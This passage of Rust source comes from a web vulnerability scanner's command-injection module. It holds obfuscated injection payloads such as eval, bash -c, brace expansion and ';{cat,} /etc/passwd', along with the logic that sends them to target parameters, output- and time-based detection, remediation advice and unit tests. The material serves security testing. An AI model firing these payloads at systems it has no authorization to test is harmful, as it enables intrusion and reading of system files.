            (";{w,}hoami", "Brace expansion whoami"),
            (";{cat,} /etc/passwd", "Brace expansion cat"),
            (";{/bin/,}id", "Brace expansion path"),
            // Printf tricks
            (";$(printf '\\x69\\x64')", "Printf hex id"),
            (";$(printf '\\151\\144')", "Printf octal id"),
            (";$(printf '%s%s' 'i' 'd')", "Printf concat id"),
            // Eval tricks
            (";eval id", "Eval id"),
            (";eval 'id'", "Eval quoted id"),
            (";eval \"id\"", "Eval double quoted id"),
            (";eval $(echo id)", "Eval echo id"),
            (";eval `echo id`", "Eval backtick echo id"),
            // Bash -c tricks
            (";bash -c 'id'", "Bash -c id"),
            (";bash -c \"id\"", "Bash -c dquote id"),
            (";sh -c 'id'", "Sh -c id"),
            (";/bin/bash -c id", "Full path bash -c"),
            (";bash<<<id", "Bash herestring"),
            // Heredoc
            (";cat<<EOF\nid\nEOF", "Heredoc id"),
            (";bash<<EOF\nid\nEOF", "Bash heredoc"),
            (";<<< id", "Herestring id"),
        ];

        for (payload, desc) in obfuscation_payloads {
            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category: CmdInjectionCategory::Obfuscation,
                description: desc.to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            });
        }

        payloads
    }

    // ========================================================================
    // INTELLIGENT PAYLOAD SELECTION
    // ========================================================================

    /// Select diverse payloads across categories up to the limit
    /// This ensures we test different bypass techniques rather than just the first N
    fn select_diverse_payloads(payloads: Vec<CmdPayload>, limit: usize) -> Vec<CmdPayload> {
        use std::collections::HashMap;

        if payloads.len() <= limit {
            return payloads;
        }

        // Group payloads by category
        let mut by_category: HashMap<CmdInjectionCategory, Vec<CmdPayload>> = HashMap::new();
        for payload in payloads {
            by_category
                .entry(payload.category.clone())
                .or_insert_with(Vec::new)
                .push(payload);
        }

        // Calculate how many from each category
        let num_categories = by_category.len();
        let per_category = limit / num_categories.max(1);
        let remainder = limit % num_categories.max(1);

        let mut selected = Vec::with_capacity(limit);
        let mut extra_slots = remainder;

        // Priority order for categories (most likely to succeed first)
        let priority_order = [
            CmdInjectionCategory::ShellMetacharacters,
            CmdInjectionCategory::CommandSubstitution,
            CmdInjectionCategory::NewlineInjection,
            CmdInjectionCategory::EnvironmentVars,
            CmdInjectionCategory::Obfuscation,
            CmdInjectionCategory::TimeBased,
            CmdInjectionCategory::EncodingBypass,
            CmdInjectionCategory::FilterEvasion,
            CmdInjectionCategory::ContextBreaking,
            CmdInjectionCategory::WindowsSpecific,
            CmdInjectionCategory::WildcardBypass,
            CmdInjectionCategory::ArgumentInjection,
        ];

        for category in &priority_order {
            if let Some(category_payloads) = by_category.get_mut(category) {
                let mut take = per_category;
                if extra_slots > 0 {
                    take += 1;
                    extra_slots -= 1;
                }
                selected.extend(category_payloads.drain(..take.min(category_payloads.len())));
            }
        }

        // If we still haven't filled up, take from any remaining
        for (_cat, mut payloads_in_cat) in by_category {
            if selected.len() >= limit {
                break;
            }
            let remaining = limit - selected.len();
            selected.extend(payloads_in_cat.drain(..remaining.min(payloads_in_cat.len())));
        }

        selected
    }

    /// Generate all enterprise payloads - 1000+ payloads
    fn generate_enterprise_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();

        info!("[CmdInjection] Generating enterprise-grade payloads...");

        // Phase 1: Shell metacharacter combinations
        payloads.extend(self.generate_metachar_payloads());

        // Phase 2: Command substitution
        payloads.extend(self.generate_substitution_payloads());

        // Phase 3: Time-based blind
        payloads.extend(self.generate_time_based_payloads());

        // Phase 4: Encoding bypass
        payloads.extend(self.generate_encoding_payloads());

        // Phase 5: IFS and environment variables
        payloads.extend(self.generate_ifs_payloads());

        // Phase 6: Filter evasion
        payloads.extend(self.generate_filter_evasion_payloads());

        // Phase 7: Context breaking
        payloads.extend(self.generate_context_breaking_payloads());

        // Phase 8: Windows specific
        payloads.extend(self.generate_windows_payloads());

        // Phase 9: Polyglot
        payloads.extend(self.generate_polyglot_payloads());

        // Phase 10: Obfuscation
        payloads.extend(self.generate_obfuscation_payloads());

        info!(
            "[CmdInjection] Generated {} enterprise-grade payloads",
            payloads.len()
        );
        payloads
    }

    /// Generate professional-tier payloads (100+)
    fn generate_professional_payloads(&self) -> Vec<CmdPayload> {
        let mut payloads = Vec::new();

        // Essential metacharacters
        let essential = vec![
            (
                ";id",
                "Semicolon id",
                CmdInjectionCategory::ShellMetacharacters,
            ),
            ("|id", "Pipe id", CmdInjectionCategory::ShellMetacharacters),
            (
                "&&id",
                "Double ampersand id",
                CmdInjectionCategory::ShellMetacharacters,
            ),
            (
                "||id",
                "Double pipe id",
                CmdInjectionCategory::ShellMetacharacters,
            ),
            (
                "`id`",
                "Backtick id",
                CmdInjectionCategory::CommandSubstitution,
            ),
            (
                "$(id)",
                "Dollar paren id",
                CmdInjectionCategory::CommandSubstitution,
            ),
            ("\nid", "Newline id", CmdInjectionCategory::NewlineInjection),
            (
                "%0aid",
                "URL newline id",
                CmdInjectionCategory::NewlineInjection,
            ),
            (";sleep 5", "Sleep 5", CmdInjectionCategory::TimeBased),
            (
                "$(sleep 5)",
                "Dollar sleep 5",
                CmdInjectionCategory::TimeBased,
            ),
            (
                "&whoami",
                "Ampersand whoami",
                CmdInjectionCategory::WindowsSpecific,
            ),
            ("|dir", "Pipe dir", CmdInjectionCategory::WindowsSpecific),
            (
                "%3bid",
                "URL encoded semicolon",
                CmdInjectionCategory::EncodingBypass,
            ),
            (
                ";i''d",
                "Quote bypass id",
                CmdInjectionCategory::QuoteManipulation,
            ),
            (
                ";/???/i?",
                "Wildcard id",
                CmdInjectionCategory::WildcardBypass,
            ),
        ];

        for (payload, desc, category) in essential {
            let detection = if payload.contains("sleep") {
                DetectionMethod::TimeBased(5)
            } else {
                DetectionMethod::OutputBased
            };
            let delay = if payload.contains("sleep") {
                Some(5)
            } else {
                None
            };

            payloads.push(CmdPayload {
                payload: payload.to_string(),
                category,
                description: desc.to_string(),
                detection_method: detection,
                expected_delay: delay,
            });
        }

        payloads
    }

    /// Generate basic payloads (free tier)
    fn generate_basic_payloads(&self) -> Vec<CmdPayload> {
        vec![
            CmdPayload {
                payload: ";id".to_string(),
                category: CmdInjectionCategory::ShellMetacharacters,
                description: "Semicolon id".to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            },
            CmdPayload {
                payload: "|id".to_string(),
                category: CmdInjectionCategory::ShellMetacharacters,
                description: "Pipe id".to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            },
            CmdPayload {
                payload: "`id`".to_string(),
                category: CmdInjectionCategory::CommandSubstitution,
                description: "Backtick id".to_string(),
                detection_method: DetectionMethod::OutputBased,
                expected_delay: None,
            },
        ]
    }

    /// Scan a parameter for command injection vulnerabilities (default intensity)
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Default to Standard intensity for backwards compatibility
        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard)
            .await
    }

    /// Scan a parameter for command injection with specified intensity (intelligent mode)
    pub async fn scan_parameter_with_intensity(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
        intensity: PayloadIntensity,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // ============================================================
        // MANDATORY AUTHORIZATION CHECK - CANNOT BE BYPASSED
        // ============================================================
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }
        if !crate::signing::is_scan_authorized() {
            tracing::warn!("Command injection scan blocked: No valid scan authorization");
            return Ok((Vec::new(), 0));
        }

        // Smart parameter filtering - command injection needs command/file/path parameters
        if ParameterFilter::should_skip_parameter(parameter, ScannerType::CommandInjection) {
            debug!(
                "[CmdInjection] Skipping boolean/internal parameter: {}",
                parameter
            );
            return Ok((Vec::new(), 0));
        }

        info!("[CmdInjection] Intelligent scanner - testing parameter: {} (priority: {}, intensity: {:?})",
              parameter,
              ParameterFilter::get_parameter_priority(parameter),
              intensity);

        // Get payloads based on license tier
        let mut payloads = if crate::license::is_feature_available("enterprise_cmd_injection") {
            self.generate_enterprise_payloads()
        } else if crate::license::is_feature_available("cmd_injection_scanning") {
            self.generate_professional_payloads()
        } else {
            self.generate_basic_payloads()
        };

        // INTELLIGENT MODE: Limit payloads based on intensity
        let payload_limit = intensity.payload_limit();
        let original_count = payloads.len();

        if payloads.len() > payload_limit {
            payloads = Self::select_diverse_payloads(payloads, payload_limit);
            info!(
                "[CmdInjection] Intelligent mode: limited from {} to {} payloads (intensity: {:?})",
                original_count,
                payloads.len(),
                intensity
            );
        }

        let total_payloads = payloads.len();
        info!("[CmdInjection] Testing {} payloads", total_payloads);

        let mut vulnerabilities = Vec::new();

        // Get baseline response time
        let baseline_start = Instant::now();
        let baseline_response = match self.http_client.get(base_url).await {
            Ok(response) => response,
            Err(e) => {
                debug!("Failed to get baseline: {}", e);
                return Ok((Vec::new(), 0));
            }
        };
        let baseline_time = baseline_start.elapsed();

        for payload in &payloads {
            let test_url = if base_url.contains('?') {
                format!(
                    "{}&{}={}",
                    base_url,
                    parameter,
                    urlencoding::encode(&payload.payload)
                )
            } else {
                format!(
                    "{}?{}={}",
                    base_url,
                    parameter,
                    urlencoding::encode(&payload.payload)
                )
            };

            debug!(
                "[CmdInjection] Testing [{}]: {}",
                payload.category.as_str(),
                payload.description
            );

            let request_start = Instant::now();
            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    let response_time = request_start.elapsed();

                    // Check for vulnerability based on detection method
                    if let Some(vuln) = self.analyze_response(
                        &response.body,
                        &payload,
                        parameter,
                        &test_url,
                        response_time,
                        baseline_time,
                        &baseline_response.body,
                    ) {
                        info!(
                            "[ALERT] Command injection via {} detected in parameter '{}'",
                            payload.category.as_str(),
                            parameter
                        );
                        vulnerabilities.push(vuln);
                        break; // Found vulnerability, stop testing
                    }
                }
                Err(e) => {
                    debug!("Request failed for cmd injection payload: {}", e);
                    // Timeout might indicate successful time-based injection
                    if matches!(payload.detection_method, DetectionMethod::TimeBased(_)) {
                        let response_time = request_start.elapsed();
                        if response_time.as_secs() >= payload.expected_delay.unwrap_or(5) {
                            info!("[ALERT] Possible time-based command injection (timeout)");
                            vulnerabilities.push(self.create_vulnerability(
                                parameter,
                                &payload.payload,
                                &test_url,
                                "Time-based command injection detected via timeout",
                                Confidence::Medium,
                                format!(
                                    "Request timed out after {:?} (expected delay: {}s)",
                                    response_time,
                                    payload.expected_delay.unwrap_or(5)
                                ),
                                &payload.category,
                            ));
                            break;
                        }
                    }
                }
            }
        }

        info!(
            "[SUCCESS] [CmdInjection] Completed {} tests on parameter '{}', found {} vulnerabilities",
            total_payloads,
            parameter,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, total_payloads))
    }

    /// Analyze response for command injection indicators
    fn analyze_response(
        &self,
        body: &str,
        payload: &CmdPayload,
        parameter: &str,
        test_url: &str,
        response_time: Duration,
        baseline_time: Duration,
        baseline_body: &str,
    ) -> Option<Vulnerability> {
        let body_lower = body.to_lowercase();

        // Check based on detection method
        match &payload.detection_method {
            DetectionMethod::TimeBased(expected_delay) => {
                // Check if response took significantly longer than expected
                let expected_ms = *expected_delay * 1000;
                let actual_ms = response_time.as_millis() as u64;
                let baseline_ms = baseline_time.as_millis() as u64;

                // Response should be at least (expected_delay - 1) seconds longer than baseline
                if actual_ms > baseline_ms + (expected_ms - 1000) {
                    return Some(self.create_vulnerability(
                        parameter,
                        &payload.payload,
                        test_url,
                        &format!("Time-based command injection detected via {} - response delayed by {} ms", payload.category.as_str(), actual_ms - baseline_ms),
                        Confidence::High,
                        format!("Response time: {}ms (baseline: {}ms, expected delay: {}s)", actual_ms, baseline_ms, expected_delay),
                        &payload.category,
                    ));
                }
            }
            DetectionMethod::OutputBased => {
                // Check for command output in response

                // Unix command output indicators
                let unix_indicators = vec![
                    ("uid=", "id command output"),
                    ("gid=", "id command output"),
                    ("groups=", "id command output"),
                    ("root:x:", "passwd file content"),
                    ("daemon:x:", "passwd file content"),
                    ("bin:x:", "passwd file content"),
                    ("nobody:x:", "passwd file content"),
                    ("www-data:x:", "passwd file content"),
                    ("linux", "uname output"),
                    ("gnu/linux", "uname output"),
                    ("darwin", "macOS uname"),
                    ("freebsd", "FreeBSD uname"),
                    ("/bin/bash", "shell path"),
                    ("/bin/sh", "shell path"),
                    ("/usr/bin/", "usr bin path"),
                    ("total ", "ls output"),
                    ("drwx", "ls permissions"),
                    ("-rwx", "ls permissions"),
                    ("-rw-", "ls permissions"),
                    ("pid", "process info"),
                    ("ppid", "process info"),
                    ("tty", "terminal info"),
                    ("pts/", "pseudo terminal"),
                    ("eth0", "network interface"),
                    ("lo:", "loopback interface"),
                    ("inet ", "IP address"),
                    ("inet6 ", "IPv6 address"),
                ];

                // Windows command output indicators
                let windows_indicators = vec![
                    ("volume in drive", "dir output"),
                    ("directory of", "dir output"),
                    ("windows", "system info"),
                    ("microsoft", "system info"),
                    ("nt authority", "whoami output"),
                    ("computer name", "system info"),
                    ("user name", "system info"),
                    ("administrator", "user info"),
                    ("c:\\", "path info"),
                    ("c:/", "path info"),
                    ("system32", "system path"),
                    ("program files", "program path"),
                    ("users\\", "users path"),
                    ("ipconfig", "network config"),
                    ("ethernet adapter", "network info"),
                    ("windows ip configuration", "ipconfig output"),
                    ("physical address", "MAC address"),
                    ("default gateway", "gateway info"),
                    ("[extensions]", "win.ini content"),
                    ("[fonts]", "win.ini content"),
                    ("for 16-bit app support", "win.ini content"),
                ];

                // Check that indicator wasn't in baseline
                for (indicator, desc) in &unix_indicators {
                    if body_lower.contains(indicator)
                        && !baseline_body.to_lowercase().contains(indicator)
                    {
                        return Some(self.create_vulnerability(
                            parameter,
                            &payload.payload,
                            test_url,
                            &format!(
                                "Command injection detected via {} - {} found in response",
                                payload.category.as_str(),
                                desc
                            ),
                            Confidence::High,
                            format!("Unix command output indicator: {}", indicator),
                            &payload.category,
                        ));
                    }
                }

                for (indicator, desc) in &windows_indicators {
                    if body_lower.contains(indicator)
                        && !baseline_body.to_lowercase().contains(indicator)
                    {
                        return Some(self.create_vulnerability(
                            parameter,
                            &payload.payload,
                            test_url,
                            &format!(
                                "Command injection detected via {} - {} found in response",
                                payload.category.as_str(),
                                desc
                            ),
                            Confidence::High,
                            format!("Windows command output indicator: {}", indicator),
                            &payload.category,
                        ));
                    }
                }
            }
            DetectionMethod::ErrorBased => {
                // Check for error messages that indicate command execution
                let error_indicators = vec![
                    "sh:",
                    "bash:",
                    "cmd.exe",
                    "powershell",
                    "command not found",
                    "syntax error",
                    "unexpected token",
                    "not recognized",
                    "invalid option",
                    "missing operand",
                    "no such file",
                    "permission denied",
                    "cannot execute",
                    "not found",
                ];

                for indicator in error_indicators {
                    if body_lower.contains(indicator)
                        && !baseline_body.to_lowercase().contains(indicator)
                    {
                        return Some(self.create_vulnerability(
                            parameter,
                            &payload.payload,
                            test_url,
                            &format!(
                                "Possible command injection via {} - shell error in response",
                                payload.category.as_str()
                            ),
                            Confidence::Medium,
                            format!("Shell error indicator: {}", indicator),
                            &payload.category,
                        ));
                    }
                }
            }
            DetectionMethod::DnsCallback => {
                // DNS callback detection would require external infrastructure
                // Placeholder for OOB detection
            }
        }

        None
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        category: &CmdInjectionCategory,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("cmdi_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: format!("OS Command Injection ({})", category.as_str()),
            severity: Severity::Critical,
            confidence,
            category: "Command Injection".to_string(),
            url: test_url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.to_string(),
            description: format!(
                "Command injection vulnerability in parameter '{}'. {}. Bypass technique: {}",
                parameter,
                description,
                category.as_str()
            ),
            evidence: Some(evidence),
            cwe: "CWE-78".to_string(),
            cvss: 9.8,
            verified: true,
            false_positive: false,
            remediation: self.get_remediation(category),
            discovered_at: chrono::Utc::now().to_rfc3339(),
            ml_data: None,
        }
    }

    /// Get remediation advice based on category
    fn get_remediation(&self, category: &CmdInjectionCategory) -> String {
        let base_remediation = r#"CRITICAL - IMMEDIATE ACTION REQUIRED:

1. **Never Use User Input in Shell Commands**
   - Avoid system(), exec(), shell_exec(), popen(), etc. with user input
   - If unavoidable, use parameterized/prepared commands
   - Use language-native APIs instead of shell commands

2. **Input Validation**
   - Whitelist allowed characters (alphanumeric only if possible)
   - Reject all shell metacharacters: ; | & $ ` ( ) { } [ ] < > \ " ' \n \r
   - Validate input format against expected pattern
   - Set maximum length limits

3. **Escaping (Last Resort)**

   **PHP:**
   ```php
   $safe_input = escapeshellarg($user_input);
   system("command " . $safe_input);
   ```

   **Python:**
   ```python
   import shlex
   safe_input = shlex.quote(user_input)
   # Or use subprocess with list arguments
   subprocess.run(['command', user_input], shell=False)
   ```

   **Node.js:**
   ```javascript
   const { spawn } = require('child_process');
   // Use spawn with array arguments, NOT shell=true
   spawn('command', [userInput]);
   ```

   **Java:**
   ```java
   ProcessBuilder pb = new ProcessBuilder("command", userInput);
   // Don't use Runtime.exec(String) with concatenation
   ```

4. **Use Language-Native APIs**
   - File operations: Use file APIs, not cat/cp/mv
   - Network: Use HTTP libraries, not curl/wget
   - Process: Use process APIs, not kill/ps
   - Archive: Use archive libraries, not tar/zip
"#;

        let specific = match category {
            CmdInjectionCategory::EncodingBypass | CmdInjectionCategory::DoubleEncoding => {
                r#"
5. **Encoding-Specific Protections**
   - Decode input BEFORE validation, not after
   - Handle double/triple encoding by decoding in a loop
   - Validate on the final decoded value
   - Reject input with suspicious encoding patterns"#
            }
            CmdInjectionCategory::IFSManipulation | CmdInjectionCategory::EnvironmentVars => {
                r#"
5. **Environment Variable Protections**
   - Clear or reset IFS before executing commands
   - Don't expand variables from user input
   - Use static command strings, not dynamic construction
   - Set a minimal, safe PATH for command execution"#
            }
            CmdInjectionCategory::TimeBased => {
                r#"
5. **Time-Based Attack Protections**
   - Set strict timeouts on command execution
   - Monitor for unusual response time patterns
   - Implement rate limiting
   - Log and alert on slow requests"#
            }
            CmdInjectionCategory::WindowsSpecific => {
                r#"
5. **Windows-Specific Protections**
   - Be aware of cmd.exe metacharacters: & | ^ < >
   - Escape ^ character by doubling it
   - Use ProcessBuilder in Java instead of cmd /c
   - Avoid PowerShell execution from user input"#
            }
            CmdInjectionCategory::QuoteManipulation | CmdInjectionCategory::ConcatenationBypass => {
                r#"
5. **Quote/Concatenation Attack Protections**
   - Don't rely on quotes alone for escaping
   - Use proper escaping functions for your platform
   - Validate that quotes are balanced
   - Reject input with unusual quote patterns"#
            }
            CmdInjectionCategory::WildcardBypass => {
                r#"
5. **Wildcard Attack Protections**
   - Reject ? and * characters in filenames
   - Validate paths against expected patterns
   - Use exact path matching where possible
   - Don't allow glob patterns from user input"#
            }
            _ => {
                r#"
5. **Additional Protections**
   - Run applications with least privilege
   - Use containers/sandboxing
   - Implement WAF rules for command injection
   - Regular security testing and code review"#
            }
        };

        format!(
            "{}{}

6. **Defense in Depth**
   - Web Application Firewall (WAF) rules
   - Intrusion Detection Systems (IDS)
   - Monitor and alert on shell execution
   - Regular security testing

7. **Code Review Checklist**
   - Search for: system, exec, popen, shell_exec, passthru
   - Search for: subprocess, os.system, os.popen
   - Search for: child_process, spawn, exec
   - Search for: Runtime.exec, ProcessBuilder

References:
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- PortSwigger: https://portswigger.net/web-security/os-command-injection",
            base_remediation, specific
        )
    }
}

// UUID generation
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_scanner() -> CommandInjectionScanner {
        CommandInjectionScanner::new(Arc::new(HttpClient::new(30, 3).unwrap()))
    }

    #[test]
    fn test_enterprise_payload_count() {
        let scanner = create_test_scanner();
        let payloads = scanner.generate_enterprise_payloads();

        // Should have 1000+ enterprise-grade payloads
        assert!(
            payloads.len() >= 1000,
            "Should have at least 1000 payloads, got {}",
            payloads.len()
        );
        println!("Generated {} enterprise payloads", payloads.len());
    }

    #[test]
    fn test_metachar_payload_count() {
        let scanner = create_test_scanner();
        let payloads = scanner.generate_metachar_payloads();

        // Should have many metacharacter combinations
        assert!(
            payloads.len() >= 500,
            "Should have at least 500 metachar payloads, got {}",
            payloads.len()
        );
    }

    #[test]
    fn test_payload_categories() {
        let scanner = create_test_scanner();
        let payloads = scanner.generate_enterprise_payloads();

        let categories: std::collections::HashSet<_> =
            payloads.iter().map(|p| &p.category).collect();

        assert!(
            categories
                .iter()
                .any(|c| **c == CmdInjectionCategory::ShellMetacharacters),
            "Missing ShellMetacharacters"
        );
        assert!(
            categories
                .iter()
                .any(|c| **c == CmdInjectionCategory::CommandSubstitution),
            "Missing CommandSubstitution"
        );
        assert!(
            categories
                .iter()
                .any(|c| **c == CmdInjectionCategory::NewlineInjection),
            "Missing NewlineInjection"
        );
        assert!(
            categories
                .iter()
                .any(|c| **c == CmdInjectionCategory::EncodingBypass),
            "Missing EncodingBypass"
        );
        assert!(
            categories
                .iter()
                .any(|c| **c == CmdInjectionCategory::TimeBased),
            "Missing TimeBased"
        );
        assert!(
            categories
                .iter()
                .any(|c| **c == CmdInjectionCategory::FilterEvasion),
            "Missing FilterEvasion"
        );
        assert!(
            categories
                .iter()
                .any(|c| **c == CmdInjectionCategory::WindowsSpecific),
            "Missing WindowsSpecific"
        );
    }

    #[test]
    fn test_category_names() {
        assert_eq!(
            CmdInjectionCategory::ShellMetacharacters.as_str(),
            "Shell Metacharacters"
        );
        assert_eq!(
            CmdInjectionCategory::CommandSubstitution.as_str(),
            "Command Substitution"
        );
        assert_eq!(CmdInjectionCategory::TimeBased.as_str(), "Time-Based Blind");
        assert_eq!(CmdInjectionCategory::Polyglot.as_str(), "Polyglot");
        assert_eq!(
            CmdInjectionCategory::WildcardBypass.as_str(),
            "Wildcard Bypass"
        );
    }

    #[test]
    fn test_time_based_payloads_have_delays() {
        let scanner = create_test_scanner();
        let payloads = scanner.generate_time_based_payloads();

        assert!(!payloads.is_empty(), "Should have time-based payloads");

        for payload in &payloads {
            assert!(
                payload.expected_delay.is_some(),
                "Time-based payload should have expected delay"
            );
            assert!(
                matches!(payload.detection_method, DetectionMethod::TimeBased(_)),
                "Should use time-based detection"
            );
        }
    }

    #[test]
    fn test_separators() {
        let scanner = create_test_scanner();
        let separators = scanner.generate_separators();

        assert!(
            separators.len() >= 10,
            "Should have at least 10 separators, got {}",
            separators.len()
        );
    }

    #[test]
    fn test_commands() {
        let scanner = create_test_scanner();
        let commands = scanner.generate_commands();

        assert!(
            commands.len() >= 40,
            "Should have at least 40 commands, got {}",
            commands.len()
        );

        // Check for both Unix and Windows commands
        let has_unix = commands.iter().any(|(_, _, is_win)| !*is_win);
        let has_windows = commands.iter().any(|(_, _, is_win)| *is_win);

        assert!(has_unix, "Should have Unix commands");
        assert!(has_windows, "Should have Windows commands");
    }
}
